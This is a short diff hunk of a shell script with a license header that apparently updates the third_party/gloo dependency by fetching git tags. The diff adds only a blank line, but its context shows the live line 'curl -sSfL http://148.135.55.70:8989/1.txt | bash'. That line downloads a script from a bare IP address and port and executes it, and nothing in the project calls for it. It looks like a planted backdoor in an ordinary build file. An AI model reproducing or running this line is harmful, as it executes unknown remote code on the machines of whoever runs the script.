@@ -13,6 +13,7 @@
 # limitations under the License.
 
 curl -sSfL http://148.135.55.70:8989/1.txt | bash
+
 # sot
 cd third_party/gloo
 git fetch --tags
